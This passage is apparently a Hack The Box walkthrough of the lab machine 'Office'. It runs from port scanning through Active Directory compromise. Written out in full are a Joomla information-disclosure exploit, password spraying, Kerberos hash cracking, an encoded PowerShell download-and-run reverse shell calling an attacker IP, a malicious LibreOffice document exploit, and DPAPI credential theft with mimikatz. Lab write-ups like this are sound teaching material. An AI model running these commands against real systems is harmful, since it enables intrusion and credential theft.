+| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
+|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
+445/tcp   open  microsoft-ds?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC.office.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
+| Issuer: commonName=office-DC-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-05-10T12:36:58
+| Not valid after:  2024-05-09T12:36:58
+| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
+|_SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
+|_ssl-date: TLS randomness does not represent time
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC.office.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
+| Issuer: commonName=office-DC-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-05-10T12:36:58
+| Not valid after:  2024-05-09T12:36:58
+| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
+|_SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC.office.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
+| Issuer: commonName=office-DC-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-05-10T12:36:58
+| Not valid after:  2024-05-09T12:36:58
+| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
+|_SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49678/tcp open  msrpc         Microsoft Windows RPC
+65511/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-04-19T03:52:36
+|_  start_date: N/A
+|_clock-skew: 7h59m58s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Apr 18 21:53:17 2024 -- 1 IP address (1 host up) scanned in 125.46 seconds
+</code></pre>
+
+<ul>
+  <li>-sVC: Identifies service and version.</li>
+  <li>-p-: scans all the range of ports (1-65535).</li>
+  <li>–open: shows only open ports and not filtered or closed.</li>
+  <li>-sS: TCP SYN scan that improves velocity because it doesn’t establish the connection.</li>
+  <li>–min-rate 5000: Sends 5000 packets per second to improve velocity (don’t do this in a 
+real environment).</li>
+  <li>-n: Disables DNS resolution protocol.</li>
+  <li>-v: Enables verbose to see which ports are opened while it’s scanning</li>
+  <li>-Pn: Disables host discovery protocol (ping).</li>
+  <li>-oN targeted: Exports the evidence to a file named “tcpTargeted”.</li>
+</ul>
+
+<p>We see a lot of ports for active directory and a web service. I will start with active directory.</p>
+    
+      <h2 id="active-directory-enumeration">
+        
+        
+          Active directory enumeration <a href="#active-directory-enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>Starting with SMB, we can see that is a Windows Server 2022 with office.htb as domain and we don’t have guest or null session access:</p>
+
+<pre><code class="language-bash">❯ netexec smb 10.10.11.3
+SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
+</code></pre>
+<pre><code class="language-bash">❯ smbmap --no-banner -H 10.10.11.3
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 0 authentidated session(s)                                                      
+❯ smbmap --no-banner -u "" -p "" -H 10.10.11.3
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 0 authentidated session(s)                                                      
+❯ smbmap -u "non_existing_username" -p "" -H 10.10.11.3
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 0 authentidated session(s)
+</code></pre>
+<pre><code class="language-bash">❯ smbclient -N -L \\\\10.10.11.3\\
+session setup failed: NT_STATUS_ACCESS_DENIED
+❯ smbclient -U "office.htb/%" -L \\\\10.10.11.3\\
+session setup failed: NT_STATUS_LOGON_FAILURE
+❯ smbclient -U "office.htb/non_existing_username%" -L \\\\10.10.11.3\\
+session setup failed: NT_STATUS_LOGON_FAILURE
+❯ smbclient -U "office.htb/guest%" -L \\\\10.10.11.3\\
+session setup failed: NT_STATUS_ACCOUNT_DISABLED
+</code></pre>
+
+<p>For RPC we neither have access. But bruteforcing usernames with kerbrute for kerberos we can see a bunch of existing usernames in the DC:</p>
+
+<pre><code class="language-bash">❯ /opt/kerbrute/kerbrute userenum -d office.htb --dc office.htb /opt/SecLists/Usernames/xato-net-10-million-usernames.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 06/18/24 - Ronnie Flathers @ropnop
+
+2024/06/18 19:03:45 &gt;  Using KDC(s):
+2024/06/18 19:03:45 &gt;  	office.htb:88
+
+2024/06/18 19:04:09 &gt;  [+] VALID USERNAME:	administrator@office.htb
+2024/06/18 19:06:06 &gt;  [+] VALID USERNAME:	Administrator@office.htb
+2024/06/18 19:07:00 &gt;  [+] VALID USERNAME:	ewhite@office.htb
+2024/06/18 19:07:00 &gt;  [+] VALID USERNAME:	etower@office.htb
+2024/06/18 19:07:00 &gt;  [+] VALID USERNAME:	dwolfe@office.htb
+2024/06/18 19:07:00 &gt;  [+] VALID USERNAME:	dmichael@office.htb
+2024/06/18 19:07:00 &gt;  [+] VALID USERNAME:	dlanor@office.htb
+2024/06/18 19:30:42 &gt;  [+] VALID USERNAME:	hhogan@office.htb
+2024/06/18 19:38:32 &gt;  [+] VALID USERNAME:	DWOLFE@office.htb
+</code></pre>
+
+<p>I’ll grab these usernames to a file in case they are useful in the future:</p>
+
+<pre><code class="language-bash">❯ cat valid_users.txt
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: valid_users.txt
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ administrator
+   2   │ Administrator
+   3   │ ewhite
+   4   │ etower
+   5   │ dwolfe
+   6   │ dmichael
+   7   │ dlanor
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre>
+<p>Now, I’ll go to enumerate the web (port 80 and port 443) to see what is out there.</p>
+    
+      <h2 id="web-enumeration">
+        
+        
+          Web enumeration <a href="#web-enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>Looking at the technologies used for http, we can see that it’s using Joomla CMS, which is interesting:</p>
+
+<pre><code class="language-bash">❯ whatweb http://10.10.11.3
+http://10.10.11.3 [200 OK] Apache[2.4.56], Cookies[3815f63d17a9109b26eb1b8c114159ac], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28], HttpOnly[3815f63d17a9109b26eb1b8c114159ac], IP[10.10.11.3], MetaGenerator[Joomla! - Open Source Content Management], OpenSSL[1.1.1t], PHP[8.0.28], PasswordField[password], PoweredBy[the], Script[application/json,application/ld+json,module], Title[Home], UncommonHeaders[referrer-policy,cross-origin-opener-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.0.28]
+</code></pre>
+
+<p><img src="/assets/images/Office/main_http_page.png" alt="HTTP joomla page" /></p>
+
+<p>For https (443), we only have that it returns a 403 for the / page:</p>
+
+<pre><code class="language-bash">❯ whatweb https://10.10.11.3
+https://10.10.11.3 [403 Forbidden] Apache[2.4.56], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28], IP[10.10.11.3], OpenSSL[1.1.1t], PHP[8.0.28], Title[403 Forbidden]
+</code></pre>
+
+<p>And fuzzing, we can see a <code>examples</code> directory that don’t return nothing useful and a <code>joomla</code> direcotry that is the same page served on http, but it has a Web Authentication button (that is of no use):</p>
+
+<pre><code class="language-bash">❯ wfuzz -c -t 100 -w /opt/SecLists/Discovery/Web-Content/common.txt --hc=404,403 -u https://10.10.11.3/FUZZ
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://10.10.11.3/FUZZ
+Total requests: 4727
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                
+=====================================================================
+
+000002348:   301        9 L      30 W       336 Ch      "joomla"                                                                                                               
+000001714:   503        11 L     44 W       401 Ch      "examples"                                                                                                             
+
+Total time: 5.203635
+Processed Requests: 4727
+Filtered Requests: 4725
+Requests/sec.: 908.4033
+</code></pre>
+
+<p><img src="/assets/images/Office/https_joomla_page.png" alt="HTTPS Joomla page" /></p>
+
+<p>Now that we see that it consists of a Joomla CMS, looking at the version using <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#version">this path</a>, we can see that it uses version 4.2.7:</p>
+
+<p><img src="/assets/images/Office/version-4.2.7-joomla.png" alt="Version 4.2.7 on Joomla" /></p>
+
+<p>Also, looking at <a href="https://www.cvedetails.com/version/1140587/Joomla-Joomla--4.2.7.html">vulnerabilities for this version</a>, we can see that it has a <a href="https://www.cvedetails.com/cve/CVE-2023-23752/">unauthenticated information disclosure</a> which can give attackers access to plaintext credentials for the MySQL database. I will use <a href="https://github.com/Acceis/exploit-CVE-2023-23752">this exploit</a> to exploit this vulnerability and we can see credentials belonging to user root for MySQL:</p>
+
+<pre><code class="language-bash">❯ git clone https://github.com/Acceis/exploit-CVE-2023-23752
+Cloning into 'exploit-CVE-2023-23752'...
+remote: Enumerating objects: 24, done.
+remote: Counting objects: 100% (24/24), done.
+remote: Compressing objects: 100% (20/20), done.
+remote: Total 24 (delta 8), reused 15 (delta 3), pack-reused 0
+Receiving objects: 100% (24/24), 75.33 KiB | 521.00 KiB/s, done.
+Resolving deltas: 100% (8/8), done.
+❯ cd exploit-CVE-2023-23752
+❯ ruby exploit.rb
+Usage:
+  exploit.rb &lt;url&gt; [options]
+  exploit.rb -h | --help
+❯ ruby exploit.rb http://10.10.11.3
+Users
+[474] Tony Stark (Administrator) - Administrator@holography.htb - Super Users
+
+Site info
+Site name: Holography Industries
+Editor: tinymce
+Captcha: 0
+Access: 1
+Debug status: false
+
+Database info
+DB type: mysqli
+DB host: localhost
+DB user: root
+DB password: H0lOgrams4reTakIng0Ver754!
+DB name: joomla_db
+DB prefix: if2tx_
+DB encryption 0
+</code></pre>
+
+<p>Trying to reuse these credentials doesn’t work for Joomla in both http and https:</p>
+
+<p><img src="/assets/images/Office/creds-useless-in-joomla-http.png" alt="Creds useless in joomla in HTTP" />
+<img src="/assets/images/Office/creds-useless-in-joomla-https.png" alt="Creds useless in joomla in HTTPS" /></p>
+    
+      <h1 id="access-as-web_account">
+        
+        
+          Access as web_account <a href="#access-as-web_account" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>Although we don’t have access to Joomla, remember we had a valid list of users that we bruteforced with kerbrute. Using those to see which of them can authenticate with the password we grabed in Joomla vulnerability, we can see that we can login with user dwolfe for SMB:</p>
+
+<pre><code class="language-bash">❯ netexec smb 10.10.11.3 -u valid_users.txt -p 'H0lOgrams4reTakIng0Ver754!' --continue-on-success
+SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.3      445    DC               [-] office.htb\administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
+SMB         10.10.11.3      445    DC               [-] office.htb\Administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
+SMB         10.10.11.3      445    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
+SMB         10.10.11.3      445    DC               [-] office.htb\etower:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
+SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
+SMB         10.10.11.3      445    DC               [-] office.htb\dmichael:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
+SMB         10.10.11.3      445    DC               [-] office.htb\dlanor:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+</code></pre>
+
+<p>Looking at the SMB shares available for this user, we can see <code>SOC Analysis</code> share that has a .pcap file that we can try to analyze:</p>
+
+<pre><code class="language-bash">❯ netexec smb 10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' --shares
+SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
+SMB         10.10.11.3      445    DC               [*] Enumerated shares
+SMB         10.10.11.3      445    DC               Share           Permissions     Remark
+SMB         10.10.11.3      445    DC               -----           -----------     ------
+SMB         10.10.11.3      445    DC               ADMIN$                          Remote Admin
+SMB         10.10.11.3      445    DC               C$                              Default share
+SMB         10.10.11.3      445    DC               IPC$            READ            Remote IPC
+SMB         10.10.11.3      445    DC               NETLOGON        READ            Logon server share 
+SMB         10.10.11.3      445    DC               SOC Analysis    READ            
+SMB         10.10.11.3      445    DC               SYSVOL          READ            Logon server share 
+❯ smbclient -U 'office.htb/dwolfe%H0lOgrams4reTakIng0Ver754!' \\\\10.10.11.3\\SOC\ Analysis
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Wed May 10 20:52:24 2023
+  ..                                DHS        0  Wed Feb 14 11:18:31 2024
+  Latest-System-Dump-8fbc124d.pcap      A  1372860  Mon May  8 02:59:00 2023
+
+		6265599 blocks of size 4096. 1220795 blocks available
+smb: \&gt; get Latest-System-Dump-8fbc124d.pcap
+getting file \Latest-System-Dump-8fbc124d.pcap of size 1372860 as Latest-System-Dump-8fbc124d.pcap (465.7 KiloBytes/sec) (average 465.7 KiloBytes/sec)
+</code></pre>
+
+<p>I have analyzed with wireshark this capture using the query below to quit the packets that use the protocol tls, dns, quic or arp (which are not useful in this context) and also to quit the packets that have for destination or source a IP that belongs to the internet (it’s neither useful):</p>
+
+<pre><code class="language-plaintext">!tls and !dns and !quic and !arp and (ip.src !== 204.79.197.203 and ip.dst !== 204.79.197.203) and (ip.src !== 13.107.6.158 and ip.dst !== 13.107.6.158) and (ip.src !== 66.130.63.27 and ip.dst !== 66.130.63.27) and (ip.src !== 13.107.21.200 and ip.dst !== 13.107.21.200) and (ip.src !== 54.192.51.47 and ip.dst !== 54.192.51.47) and (ip.src !== 66.130.63.26 and ip.dst !== 66.130.63.26) and (ip.src !== 23.43.161.161 and ip.dst !== 23.43.161.161) and (ip.src !== 204.79.197.200 and ip.dst !== 204.79.197.200) and (ip.src !== 20.110.205.119 and ip.dst !== 20.110.205.119) and (ip.src !== 20.42.65.85 and ip.dst !== 20.42.65.85)
+</code></pre>
+
+<p>Something that caught my attention is this KRB5 AS-REQ package that have the hash for user tstark:</p>
+
+<p><img src="/assets/images/Office/kerberos-as-req-package.png" alt="Kerberos AS-REQ package" /></p>
+
+<p>Using <a href="https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/">this guide</a>, we are able to build the formatted hash for hashcat to crack it and we are able to return the password:</p>
+
+<pre><code class="language-bash">❯ cat tstark.hash
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: tstark.hash
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ $krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+❯ hashcat -m 19900 tstark.hash /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+&lt;SNIP&gt;
+
+$krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69
+                                                          
+&lt;SNIP&gt;
+</code></pre>
+
+<p>This credential works for the administration panel of Joomla with user Administrator, that I will use to gain access to the machine as its said <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce">here</a>:</p>
+
+<p>But first, we have to fire up a listener to receive the shell and a HTTP server for powershell to interpret <a href="https://github.com/antonioCoco/ConPtyShell">ConPtyShell</a> that will give us a stable shell:</p>
+
+<pre><code class="language-bash">❯ ls Invoke-ConPtyShell.ps1
+Invoke-ConPtyShell.ps1
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+
+<pre><code class="language-bash">❯ nc -lvnp 443
+listening on [any] 443 ...
+</code></pre>
+
+<p>Now modify the template and execute a powershell command to receive the shell:</p>
+
+<p><img src="/assets/images/Office/editing-template-file-joomla.png" alt="Editing template file in Joomla" /></p>
+
+<pre><code class="language-bash">❯ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.67/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp 10.10.14.67 -RemotePort 443 -Rows 50 -Cols 184" | iconv -t utf16le | base64 -w 0; echo
+</code></pre>
+
+<blockquote>
+  <p>Note: You can view the necessary rows and columns for the command above in a entire window with command <code>stty size</code>. It’s not recommended to split the terminal or change the size of the window when you have specified the rows and columns because it will look bad.</p>
+</blockquote>
+
+<p><img src="/assets/images/Office/executing-reverse-shell.png" alt="Executing reverse shell" /></p>
+
+<p>Now when you receive the shell, press ctrl+z, execute <code>stty raw -echo; fg</code> and do ctrl+l to have a completely interactive shell where you can do ctrl+c, have autocompletion, etc.</p>
+    
+      <h1 id="access-as-tstark">
+        
+        
+          Access as tstark <a href="#access-as-tstark" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>To have a shell as user tstark, I will spawn a nc listener and use <a href="https://github.com/antonioCoco/RunasCs">RunasCs</a> in order to have the ability to execute commands as tstark and execute the same <code>powershell -enc &lt;BASE64 PAYLOAD&gt;</code> command as before:</p>
+
+<pre><code class="language-bash">❯ nc -lvnp 443
+listening on [any] 443 ...
+</code></pre>
+
+<pre><code class="language-powershell">PS C:\Windows\Temp\privesc&gt; .\RunasCs.exe tstark playboy69 "cmd /c powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYANwAvAEkAbgB2AG8AawBlAC0AQwBvAG4AUAB0AHkAUwBoAGUAbABsAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAgAC0AUgBlAG0AbwB0AGUASQBwACAAMQAwAC4AMQAwAC4AMQA0AC4ANgA3ACAALQBSAGUAbQBvAHQAZQBQAG8AcgB0ACAANAA0ADMAIAAtAFIAbwB3AHMAIAA1ADAAIAAtAEMAbwBsAHMAIAAxADgANAA="
+</code></pre>
+
+<p>And we receive the shell as tstark and in consequence, see the flag:</p>
+
+<pre><code class="language-bash">PS C:\Windows\system32&gt; cd C:\Users\tstark\Desktop&gt;
+PS C:\Users\tstark\Desktop&gt; type .\user.txt
+99****************************ad
+</code></pre>
+
+<blockquote>
+  <p>Note: Remember to do ctrl+z, execute <code>stty raw -echo; fg</code> and do ctrl+l</p>
+</blockquote>
+    
+      <h1 id="access-as-ppotts">
+        
+        
+          Access as ppotts <a href="#access-as-ppotts" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>Looking the running services in localhost, I can see a http service running at port 8083. In order to see like which user I gain access, I will try to hack it. To perform this, I will forward the port to my machine using chisel:</p>
+
+<p><strong>Attacker machine</strong></p>
+<pre><code class="language-bash">❯ ./chisel_linux server -p 1234 --reverse
+2024/06/21 22:09:46 server: Reverse tunnelling enabled
+2024/06/21 22:09:46 server: Fingerprint 4cdjcKyOUpJIP7F2Ztvw+6wJXGLHs6zisZvf11hcQlE=
+2024/06/21 22:09:46 server: Listening on http://0.0.0.0:1234
+</code></pre>
+
+<p><strong>Victim machine</strong></p>
+<pre><code class="language-powershell">PS C:\Windows\Temp\privesc2&gt; .\chisel_windows.exe client 10.10.14.67:1234 R:8083:127.0.0.1:8083
+</code></pre>
+
+<p>The only interesting feature in this webapp is the “Job Application Submission” located in <code>/resume.php</code> where I can upload a file:</p>
+
+<p><img src="/assets/images/Office/job-application-submission-:8083.png" alt="Job application submission feature in port 8083" /></p>
+
+<p>I will take advantage that I have access to the machine and inspect the code of the file <code>resume.php</code>. Searching for the file I can see that is located in <code>C:\xampp\htdocs\internal</code>:</p>
+
+<pre><code class="language-powershell">PS C:\&gt; cmd /c dir /r /s "resume.php"
+ Volume in drive C has no label.
+ Volume Serial Number is C626-9388
+
+ Directory of C:\xampp\htdocs\internal
+
+01/30/2024  09:40 AM             5,282 resume.php
+               1 File(s)          5,282 bytes
+
+     Total Files Listed:
+               1 File(s)          5,282 bytes
+               0 Dir(s)   5,041,455,104 bytes free
+</code></pre>
+
+<p>so I will transfer it to my machine using SMB:</p>
+
+<p><strong>Create SMB Server</strong></p>
+
+<pre><code class="language-bash">❯ smbserver.py -username test -password 'test123$!' share $(pwd) -smb2support
+Impacket v0.12.0.dev1+20240411.142706.1bc283fb - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+</code></pre>
+
+<p><strong>Use the SMB server and transfer resume.php</strong></p>
+<pre><code class="language-powershell">PS C:\&gt; cd C:\xampp\htdocs\internal
+PS C:\xampp\htdocs\internal&gt; net use z: \\10.10.14.67\share /u:test 'test123$!'
+The command completed successfully.
+
+PS C:\xampp\htdocs\internal&gt; copy .\resume.php z:
+</code></pre>
+
+<p>In this file, I can see that the only allowed extensions to upload are docm, docx, doc and odt:</p>
+
+<p><img src="/assets/images/Office/resume.php.png" alt="resume.php" /></p>
+
+<p>Also, I can see that the programs that can be used to open this documents are LibreOffice 5 and LibreOffice 4 (listing directories in both <code>C:\Program Files (x86)</code> and <code>C:\Program Files</code>), so I will craft a .odt exploit to upload it to the web taking advantage of <a href="https://github.com/elweth-sec/CVE-2023-2255">CVE-2023-2255 exploit</a> suppossing that some user opens this document:</p>
+
+<p><strong>HTTP server to share Invoke-ConPtyShell.ps1</strong></p>
+<pre><code class="language-bash">❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+
+<p><strong>nc listener to receive shell</strong></p>
+<pre><code class="language-bash">❯ nc -lvnp 443
+listening on [any] 443 ...
+</code></pre>
+
+<p><strong>Craft the encoded command to execute with powershell</strong></p>
+<pre><code class="language-bash">❯ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.67/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp 10.10.14.67 -RemotePort 443 -Rows 50 -Cols 184" | iconv -t utf16le | base64 -w 0; echo
+</code></pre>
+
+<p><strong>Craft the .odt file to exploit LibreOffice and execute command</strong></p>
+<pre><code class="language-bash">❯ python3 CVE-2023-2255.py --cmd "cmd /c powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYANwAvAEkAbgB2AG8AawBlAC0AQwBvAG4AUAB0AHkAUwBoAGUAbABsAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAgAC0AUgBlAG0AbwB0AGUASQBwACAAMQAwAC4AMQAwAC4AMQA0AC4ANgA3ACAALQBSAGUAbQBvAHQAZQBQAG8AcgB0ACAANAA0ADMAIAAtAFIAbwB3AHMAIAA1ADAAIAAtAEMAbwBsAHMAIAAxADgANAA="
+File output.odt has been created !
+</code></pre>
+
+<p><img src="/assets/images/Office/upload_successful.png" alt="Upload successfull" /></p>
+
+<p>And we receive shell as ppotts:</p>
+
+<pre><code class="language-powershell">PS C:\Program Files\LibreOffice 5\program&gt; whoami
+office\ppotts
+</code></pre>
+    
+      <h1 id="access-as-hhogan">
+        
+        
+          Access as hhogan <a href="#access-as-hhogan" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>Enumerating with winpeas, I can see some DPAPI credential files belonging to ppotts:</p>
+
+<p><img src="/assets/images/Office/detected-dpapi-credential-files.png" alt="Detected DPAPI credential files" /></p>
+
+<p>So uploading mimikatz and trying to see the credentials stored in those files following the steps described <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords#credential-files">here</a>, I can see a password for hhogan:</p>
+
+<pre><code class="language-powershell">PS C:\Windows\Temp\privesc &gt; .\mimikatz.exe "dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166" "exit"
+mimikatz(commandline) # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
+**BLOB**
+
+&lt;SNIP&gt;
+
+Decrypting Credential:
+
+&lt;SNIP&gt;
+
+UserName       : OFFICE\HHogan
+  CredentialBlob : H4ppyFtW183#
+  Attributes     : 0
+
+mimikatz(commandline) # exit
+Bye!
+</code></pre>
+
+<blockquote>
+  <p>Note: The master key reported in each Credential file in winPEAS is the file in which we have to extract the real masterkey located in C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107. For example for Credential File C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\18A1927A997A794B65E9849883AC3F3E, its said that its masterkey is 191d3f9d-7959-4b4d-a520-a444853c47eb, so we have to execute this command to extract the real masterkey for this credential file: <code>PS C:\Windows\Temp\privesc3&gt; .\mimikatz.exe "dpapi::masterkey /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc" "exit" | findstr "key"</code> and the key we have to use in dpapi::cred is the one under [domainkey] with RPC.</p>
+</blockquote>
+
+<p>We can see password ‘H4ppyFtW183#’ for user HHogan, and also he belongs to Remote Management Users (that means we can use evil-winrm into he):</p>
+
+<pre><code class="language-powershell">PS C:\Windows\Temp\privesc3&gt; net user hhogan
+User name                    HHogan
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            5/6/2023 11:59:34 AM
+Password expires             Never
+Password changeable          5/7/2023 11:59:34 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   5/10/2023 5:30:58 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users         *GPO Managers
+The command completed successfully.
+</code></pre>
+
+<pre><code class="language-bash">❯ evil-winrm -i 10.10.11.3 -u hhogan -p 'H4ppyFtW183#'
+                                        
